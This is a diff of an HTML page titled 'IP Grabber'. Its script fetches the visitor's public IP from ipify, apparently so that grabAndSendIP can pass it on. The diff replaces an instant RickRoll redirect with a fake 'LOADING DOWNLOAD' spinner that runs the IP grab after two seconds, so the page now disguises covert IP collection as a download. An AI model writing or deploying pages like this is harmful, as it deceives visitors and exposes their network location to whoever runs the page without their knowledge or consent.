@@ -4,6 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Grabber</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .content {
+            text-align: center;
+        }
+    </style>
     <script>
         function grabAndSendIP() {
             fetch('https://api.ipify.org?format=json')
@@ -24,14 +51,20 @@
                 })
                 .catch(error => console.error('Error grabbing IP:', error));
         }
-
-        window.onload = function() {
-            grabAndSendIP();
-            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';  // RickRoll redirect
-        };
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const loader = document.querySelector('.loader');
+            loader.style.display = 'block';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                grabAndSendIP();
+            }, 2000);
+        });
     </script>
 </head>
 <body>
-    <h1>IP Grabber</h1>
+    <div class="content">
+        <div class="loader"></div>
+        <p>LOADING DOWNLOAD</p>
+    </div>
 </body>
 </html>
